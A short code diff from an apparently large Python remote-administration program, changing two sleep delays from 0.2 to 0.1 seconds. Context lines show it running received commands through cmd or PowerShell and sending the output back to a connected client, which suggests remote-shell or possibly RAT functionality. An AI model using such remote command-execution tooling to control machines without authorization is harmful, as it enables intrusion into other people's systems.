@@ -2713,7 +2713,7 @@ STATUS: {n[7]}\n
                 else:
                     send((wincmd if is_cmd else powershell)(wcommand, output=True))
 
-                sleep(0.2)
+                sleep(0.1)
             
             os.chdir(current_path)
             return
@@ -4754,7 +4754,7 @@ CONNECTION DATE: {session_date[0]} | {session_date[1]}''')
         except BaseException as error:
             send(client, f'{type(error).__name__}({error})')
 
-        sleep(0.2)
+        sleep(0.1)
 
 
 def main():
